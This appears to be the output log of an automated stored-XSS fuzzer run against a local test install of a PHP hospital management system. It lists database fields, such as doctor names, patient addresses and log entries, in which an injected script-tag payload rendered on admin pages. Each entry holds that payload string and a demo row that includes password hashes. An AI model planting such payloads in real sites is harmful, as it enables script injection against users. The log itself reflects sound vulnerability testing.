http://localhost/hospital/hms/admin/read-query.php#",938324,"""'><script>xss(938324)</script>","
            hms.tblcontactus.fullname[1][1]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, '""\'><script>xss(938324)</script>', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'Anuj kumar' => '""'><script>xss(938324)</script>'
            
fuzzed after scan 15 / 41
found as XSS in scan 16 / 41"
hospital,appointment.appointmentTime,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",939108,"""'><script>xss(939108)</script>","
            hms.appointment.appointmentTime[1][6]
            original row: [2, 'ENT', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            fuzzed row: [2, 'ENT', 1, 2, 500, '2022-11-17', '""\'><script>xss(939108)</script>', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            change: '7:00 PM' => '""'><script>xss(939108)</script>'
            
fuzzed after scan 5 / 41
found as XSS in scan 6 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",939802,"""'><script>xss(939802)</script>","
            hms.doctorslog.logout[2][5]
            original row: [22, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '06-11-2022 05:36:40 PM', 1]
            fuzzed row: [22, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 6, 37), '""\'><script>xss(939802)</script>', 1]
            change: '06-11-2022 05:36:40 PM' => '""'><script>xss(939802)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,tblmedicalhistory.MedicalPres,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,944132,"""'><script>xss(944132)</script>","
            hms.tblmedicalhistory.MedicalPres[0][6]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '120', '85', '98', '""\'><script>xss(944132)</script>', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: 'Test' => '""'><script>xss(944132)</script>'
            
fuzzed after scan 23 / 41
found as XSS in scan 24 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",944242,"""'><script>xss(944242)</script>","
            hms.doctorslog.username[4][2]
            original row: [24, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 23, 18), '06-11-2022 05:53:40 PM', 1]
            fuzzed row: [24, 1, '""\'><script>xss(944242)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 23, 18), '06-11-2022 05:53:40 PM', 1]
            change: 'anujk123@test.com' => '""'><script>xss(944242)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,appointment.doctorSpecialization,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",945242,"""'><script>xss(945242)</script>","
            hms.appointment.doctorSpecialization[1][1]
            original row: [2, 'ENT', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            fuzzed row: [2, '""\'><script>xss(945242)</script>', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            change: 'ENT' => '""'><script>xss(945242)</script>'
            
fuzzed after scan 3 / 41
found as XSS in scan 4 / 41"
hospital,tblpage.OpenningTime,http://localhost/hospital/index.php,945626,"""'><script>xss(945626)</script>","
            hms.tblpage.OpenningTime[1][7]
            original row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            fuzzed row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '""\'><script>xss(945626)</script>']
            change: '9 am To 8 Pm' => '""'><script>xss(945626)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,doctors.specilization,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",945632,"""'><script>xss(945632)</script>","
            hms.doctors.specilization[1][1]
            original row: [2, 'Endocrinologists', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            fuzzed row: [2, '""\'><script>xss(945632)</script>', 'Charu Dua', 'X 1212 ABC Apartment Laxmi Nagar New Delhi ', '800', 1231231230, 'charudua12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 4, 1, 6, 41), None]
            change: 'Endocrinologists' => '""'><script>xss(945632)</script>'
            
fuzzed after scan 6 / 41
found as XSS in scan 7 / 41"
hospital,users.address,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",946273,"""'><script>xss(946273)</script>","
            hms.users.address[0][2]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', '""\'><script>xss(946273)</script>', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'A 123 ABC Apartment GZB 201017' => '""'><script>xss(946273)</script>'
            
fuzzed after scan 37 / 41
found as XSS in scan 38 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=4",946655,"""'><script>xss(946655)</script>","
            hms.doctorspecilization.specilization[3][1]
            original row: [4, 'Dermatology', datetime.datetime(2022, 10, 30, 18, 10, 28), None]
            fuzzed row: [4, '""\'><script>xss(946655)</script>', datetime.datetime(2022, 10, 30, 18, 10, 28), None]
            change: 'Dermatology' => '""'><script>xss(946655)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",946990,"""'><script>xss(946990)</script>","
            hms.userlog.username[1][2]
            original row: [2, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '06-11-2022 05:53:00 PM', 1]
            fuzzed row: [2, 1, '""\'><script>xss(946990)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 21, 20), '06-11-2022 05:53:00 PM', 1]
            change: 'johndoe12@test.com' => '""'><script>xss(946990)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,users.fullName,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#
http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",948344,"""'><script>xss(948344)</script>","
            hms.users.fullName[1][1]
            original row: [2, 'Amit kumar', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            fuzzed row: [2, '""\'><script>xss(948344)</script>', 'new Delhi india', 'New Delhi', 'male', 'amitk@gmail.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 13, 15, 32), None]
            change: 'Amit kumar' => '""'><script>xss(948344)</script>'
            
fuzzed after scan 36 / 41
found as XSS in scan 37 / 41"
hospital,doctors.doctorName,"http://localhost/hospital/hms/admin/Manage-doctors.php
http://localhost/hospital/hms/admin/Manage-doctors.php#
http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#
http://localhost/hospital/hms/admin/manage-doctors.php
http://localhost/hospital/hms/admin/manage-doctors.php#",950279,"""'><script>xss(950279)</script>","
            hms.doctors.doctorName[0][2]
            original row: [1, 'ENT', 'Anuj kumar', 'A 123 XYZ Apartment Raj Nagar Ext Ghaziabad', '500', 142536250, 'anujk123@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 10, 30, 18, 16, 52), datetime.datetime(2022, 11, 6, 13, 20, 17)]
            fuzzed row: [1, 'ENT', '""\'><script>xss(950279)</script>', 'A 123 XYZ Apartment Raj Nagar Ext Ghaziabad', '500', 142536250, 'anujk123@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 10, 30, 18, 16, 52), datetime.datetime(2022, 11, 6, 13, 20, 17)]
            change: 'Anuj kumar' => '""'><script>xss(950279)</script>'
            
fuzzed after scan 7 / 41
found as XSS in scan 8 / 41"
hospital,appointment.appointmentDate,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",951431,"""'><script>xss(951431)</script>","
            hms.appointment.appointmentDate[1][5]
            original row: [2, 'ENT', 1, 2, 500, '2022-11-17', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            fuzzed row: [2, 'ENT', 1, 2, 500, '""\'><script>xss(951431)</script>', '7:00 PM', datetime.datetime(2022, 11, 6, 13, 16, 18), 1, 1, None]
            change: '2022-11-17' => '""'><script>xss(951431)</script>'
            
fuzzed after scan 4 / 41
found as XSS in scan 5 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",954596,"""'><script>xss(954596)</script>","
            hms.doctorslog.logout[5][5]
            original row: [25, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '06-11-2022 06:47:07 PM', 1]
            fuzzed row: [25, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 16, 53), '""\'><script>xss(954596)</script>', 1]
            change: '06-11-2022 06:47:07 PM' => '""'><script>xss(954596)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",955146,"""'><script>xss(955146)</script>","
            hms.doctorslog.username[7][2]
            original row: [27, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '06-03-2023 01:02:48 PM', 1]
            fuzzed row: [27, 1, '""\'><script>xss(955146)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 40), '06-03-2023 01:02:48 PM', 1]
            change: 'anujk123@test.com' => '""'><script>xss(955146)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=7",955506,"""'><script>xss(955506)</script>","
            hms.doctorspecilization.specilization[6][1]
            original row: [7, 'General Surgery', datetime.datetime(2022, 10, 30, 18, 10, 56), None]
            fuzzed row: [7, '""\'><script>xss(955506)</script>', datetime.datetime(2022, 10, 30, 18, 10, 56), None]
            change: 'General Surgery' => '""'><script>xss(955506)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",957581,"""'><script>xss(957581)</script>","
            hms.userlog.logout[2][5]
            original row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), None, 0]
            fuzzed row: [3, None, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 43), '""\'><script>xss(957581)</script>', 0]
            change: 'None' => '""'><script>xss(957581)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",958037,"""'><script>xss(958037)</script>","
            hms.userlog.logout[3][5]
            original row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            fuzzed row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '""\'><script>xss(958037)</script>', 1]
            change: '06-11-2022 06:50:46 PM' => '""'><script>xss(958037)</script>'
            
fuzzed after scan 35 / 41
found as XSS in scan 36 / 41"
hospital,tblpatient.PatientAdd,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,958769,"""'><script>xss(958769)</script>","
            hms.tblpatient.PatientAdd[0][6]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', '""\'><script>xss(958769)</script>', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'New Delhi india' => '""'><script>xss(958769)</script>'
            
fuzzed after scan 32 / 41
found as XSS in scan 33 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",959094,"""'><script>xss(959094)</script>","
            hms.doctorslog.logout[0][5]
            original row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), None, 0]
            fuzzed row: [20, None, 'gfdgdf', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 4, 1, 2, 16), '""\'><script>xss(959094)</script>', 0]
            change: 'None' => '""'><script>xss(959094)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,tblcontactus.AdminRemark,http://localhost/hospital/hms/admin/query-details.php?id=2,962644,"""'><script>xss(962644)</script>","
            hms.tblcontactus.AdminRemark[1][6]
            original row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), 'Contact the patient', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            fuzzed row: [2, 'Anuj kumar', 'ak@gmail.com', 1111122233, 'This is for testing', datetime.datetime(2022, 11, 6, 13, 13, 41), '""\'><script>xss(962644)</script>', datetime.datetime(2022, 11, 6, 13, 13, 57), 1]
            change: 'Contact the patient' => '""'><script>xss(962644)</script>'
            
fuzzed after scan 18 / 41
found as XSS in scan 19 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",962826,"""'><script>xss(962826)</script>","
            hms.doctorslog.logout[3][5]
            original row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '06-11-2022 05:42:53 PM', 1]
            fuzzed row: [23, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 8, 56), '""\'><script>xss(962826)</script>', 1]
            change: '06-11-2022 05:42:53 PM' => '""'><script>xss(962826)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",963610,"""'><script>xss(963610)</script>","
            hms.doctorslog.username[8][2]
            original row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            fuzzed row: [28, 1, '""\'><script>xss(963610)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            change: 'anujk123@test.com' => '""'><script>xss(963610)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=6",965194,"""'><script>xss(965194)</script>","
            hms.doctorspecilization.specilization[5][1]
            original row: [6, 'Radiology', datetime.datetime(2022, 10, 30, 18, 10, 46), None]
            fuzzed row: [6, '""\'><script>xss(965194)</script>', datetime.datetime(2022, 10, 30, 18, 10, 46), None]
            change: 'Radiology' => '""'><script>xss(965194)</script>'
            
fuzzed after scan 14 / 41
found as XSS in scan 15 / 41"
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",968060,"""'><script>xss(968060)</script>","
            hms.doctorslog.logout[8][5]
            original row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), None, 1]
            fuzzed row: [28, 1, 'anujk123@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 38, 7), '""\'><script>xss(968060)</script>', 1]
            change: 'None' => '""'><script>xss(968060)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,tblmedicalhistory.Weight,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,968483,"""'><script>xss(968483)</script>","
            hms.tblmedicalhistory.Weight[0][4]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '120', '""\'><script>xss(968483)</script>', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '85' => '""'><script>xss(968483)</script>'
            
fuzzed after scan 21 / 41
found as XSS in scan 22 / 41"
hospital,tblmedicalhistory.Temperature,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,970523,"""'><script>xss(970523)</script>","
            hms.tblmedicalhistory.Temperature[0][5]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '120', '85', '""\'><script>xss(970523)</script>', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '98' => '""'><script>xss(970523)</script>'
            
fuzzed after scan 22 / 41
found as XSS in scan 23 / 41"
hospital,tblpatient.PatientEmail,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,971471,"""'><script>xss(971471)</script>","
            hms.tblpatient.PatientEmail[0][4]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, 'Amit Kumar', 1231231230, '""\'><script>xss(971471)</script>', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'amitk@gmail.com' => '""'><script>xss(971471)</script>'
            
fuzzed after scan 30 / 41
found as XSS in scan 31 / 41"
hospital,tblpage.PageTitle,"http://localhost/hospital/hms/admin/about-us.php
http://localhost/hospital/hms/admin/about-us.php#",971716,"""'><script>xss(971716)</script>","
            hms.tblpage.PageTitle[0][2]
            original row: [1, 'aboutus', 'About Us', '<ul style=""padding: 0px; margin-right: 0px; margin-bottom: 1.313em; margin-left: 1.655em;"" times="""" new="""" roman"";="""" font-size:="""" 14px;="""" text-align:="""" center;="""" background-color:="""" rgb(255,="""" 246,="""" 246);""=""""><li style=""text-align: left;""><font color=""#000000"">The Hospital Management System (HMS) is designed for Any Hospital to replace their existing manual, paper based system. The new system is to control the following information; patient information, room availability, staff and operating room schedules, and patient invoices. These services are to be provided in an efficient, cost effective manner, with the goal of reducing the time and resources currently required for such tasks.</font></li><li style=""text-align: left;""><font color=""#000000"">A significant part of the operation of any hospital involves the acquisition, management and timely retrieval of great volumes of information. This information typically involves; patient personal information and medical history, staff information, room and ward scheduling, staff scheduling, operating theater scheduling and various facilities waiting lists. All of this information must be managed in an efficient and cost wise fashion so that an institution\'s resources may be effectively utilized HMS will automate the management of the hospital making it more efficient and error free. It aims at standardizing data, consolidating data ensuring data integrity and reducing inconsistencies.&nbsp;</font></li></ul>', None, None, datetime.datetime(2020, 5, 20, 7, 21, 52), None]
            fuzzed row: [1, 'aboutus', '""\'><script>xss(971716)</script>', '<ul style=""padding: 0px; margin-right: 0px; margin-bottom: 1.313em; margin-left: 1.655em;"" times="""" new="""" roman"";="""" font-size:="""" 14px;="""" text-align:="""" center;="""" background-color:="""" rgb(255,="""" 246,="""" 246);""=""""><li style=""text-align: left;""><font color=""#000000"">The Hospital Management System (HMS) is designed for Any Hospital to replace their existing manual, paper based system. The new system is to control the following information; patient information, room availability, staff and operating room schedules, and patient invoices. These services are to be provided in an efficient, cost effective manner, with the goal of reducing the time and resources currently required for such tasks.</font></li><li style=""text-align: left;""><font color=""#000000"">A significant part of the operation of any hospital involves the acquisition, management and timely retrieval of great volumes of information. This information typically involves; patient personal information and medical history, staff information, room and ward scheduling, staff scheduling, operating theater scheduling and various facilities waiting lists. All of this information must be managed in an efficient and cost wise fashion so that an institution\'s resources may be effectively utilized HMS will automate the management of the hospital making it more efficient and error free. It aims at standardizing data, consolidating data ensuring data integrity and reducing inconsistencies.&nbsp;</font></li></ul>', None, None, datetime.datetime(2020, 5, 20, 7, 21, 52), None]
            change: 'About Us' => '""'><script>xss(971716)</script>'
            
fuzzed after scan 25 / 41
found as XSS in scan 26 / 41"
hospital,tblpatient.PatientMedhis,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,972437,"""'><script>xss(972437)</script>","
            hms.tblpatient.PatientMedhis[0][8]
            original row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, 'NA', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            fuzzed row: [1, 1, 'Amit Kumar', 1231231230, 'amitk@gmail.com', 'male', 'New Delhi india', 35, '""\'><script>xss(972437)</script>', datetime.datetime(2022, 11, 6, 13, 18, 31), None]
            change: 'NA' => '""'><script>xss(972437)</script>'
            
fuzzed after scan 33 / 41
found as XSS in scan 34 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",973692,"""'><script>xss(973692)</script>","
            hms.userlog.username[4][2]
            original row: [5, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            fuzzed row: [5, 1, '""\'><script>xss(973692)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 32, 14), '06-03-2023 01:02:22 PM', 1]
            change: 'johndoe12@test.com' => '""'><script>xss(973692)</script>'
            
fuzzed after scan 34 / 41
found as XSS in scan 35 / 41"
hospital,tblpage.Email,"http://localhost/hospital/hms/admin/contact.php
http://localhost/hospital/hms/admin/contact.php#
http://localhost/hospital/index.php",976310,"""'><script>xss(976310)</script>","
            hms.tblpage.Email[1][4]
            original row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', 'info@gmail.com', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            fuzzed row: [2, 'contactus', 'Contact Details', 'D-204, Hole Town South West, Delhi-110096,India', '""\'><script>xss(976310)</script>', 1122334455, datetime.datetime(2020, 5, 20, 7, 24, 7), '9 am To 8 Pm']
            change: 'info@gmail.com' => '""'><script>xss(976310)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",978693,"""'><script>xss(978693)</script>","
            hms.doctorslog.username[6][2]
            original row: [26, 1, 'anujk123@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '06-11-2022 06:50:28 PM', 1]
            fuzzed row: [26, 1, '""\'><script>xss(978693)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 17, 33), '06-11-2022 06:50:28 PM', 1]
            change: 'anujk123@test.com' => '""'><script>xss(978693)</script>'
            
fuzzed after scan 12 / 41
found as XSS in scan 13 / 41"
hospital,tblpage.PageDescription,http://localhost/hospital/index.php,979486,"""'><script>xss(979486)</script>","
            hms.tblpage.PageDescription[0][3]
            original row: [1, 'aboutus', 'About Us', '<ul style=""padding: 0px; margin-right: 0px; margin-bottom: 1.313em; margin-left: 1.655em;"" times="""" new="""" roman"";="""" font-size:="""" 14px;="""" text-align:="""" center;="""" background-color:="""" rgb(255,="""" 246,="""" 246);""=""""><li style=""text-align: left;""><font color=""#000000"">The Hospital Management System (HMS) is designed for Any Hospital to replace their existing manual, paper based system. The new system is to control the following information; patient information, room availability, staff and operating room schedules, and patient invoices. These services are to be provided in an efficient, cost effective manner, with the goal of reducing the time and resources currently required for such tasks.</font></li><li style=""text-align: left;""><font color=""#000000"">A significant part of the operation of any hospital involves the acquisition, management and timely retrieval of great volumes of information. This information typically involves; patient personal information and medical history, staff information, room and ward scheduling, staff scheduling, operating theater scheduling and various facilities waiting lists. All of this information must be managed in an efficient and cost wise fashion so that an institution\'s resources may be effectively utilized HMS will automate the management of the hospital making it more efficient and error free. It aims at standardizing data, consolidating data ensuring data integrity and reducing inconsistencies.&nbsp;</font></li></ul>', None, None, datetime.datetime(2020, 5, 20, 7, 21, 52), None]
            fuzzed row: [1, 'aboutus', 'About Us', '""\'><script>xss(979486)</script>', None, None, datetime.datetime(2020, 5, 20, 7, 21, 52), None]
            change: '<ul style=""padding: 0px; margin-right: 0px; margin-bottom: 1.313em; margin-left: 1.655em;"" times="""" new="""" roman"";="""" font-size:="""" 14px;="""" text-align:="""" center;="""" background-color:="""" rgb(255,="""" 246,="""" 246);""=""""><li style=""text-align: left;""><font color=""#000000"">The Hospital Management System (HMS) is designed for Any Hospital to replace their existing manual, paper based system. The new system is to control the following information; patient information, room availability, staff and operating room schedules, and patient invoices. These services are to be provided in an efficient, cost effective manner, with the goal of reducing the time and resources currently required for such tasks.</font></li><li style=""text-align: left;""><font color=""#000000"">A significant part of the operation of any hospital involves the acquisition, management and timely retrieval of great volumes of information. This information typically involves; patient personal information and medical history, staff information, room and ward scheduling, staff scheduling, operating theater scheduling and various facilities waiting lists. All of this information must be managed in an efficient and cost wise fashion so that an institution's resources may be effectively utilized HMS will automate the management of the hospital making it more efficient and error free. It aims at standardizing data, consolidating data ensuring data integrity and reducing inconsistencies.&nbsp;</font></li></ul>' => '""'><script>xss(979486)</script>'
            
fuzzed after scan 26 / 41
found as XSS in scan 27 / 41"
hospital,appointment.appointmentDate,"http://localhost/hospital/hms/admin/appointment-history.php
http://localhost/hospital/hms/admin/appointment-history.php#",982706,"""'><script>xss(982706)</script>","
            hms.appointment.appointmentDate[0][5]
            original row: [1, 'ENT', 1, 1, 500, '2022-11-10', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            fuzzed row: [1, 'ENT', 1, 1, 500, '""\'><script>xss(982706)</script>', '12:45 PM', datetime.datetime(2022, 11, 6, 12, 21, 48), 1, 0, datetime.datetime(2022, 11, 6, 12, 23, 35)]
            change: '2022-11-10' => '""'><script>xss(982706)</script>'
            
fuzzed after scan 4 / 41
found as XSS in scan 5 / 41"
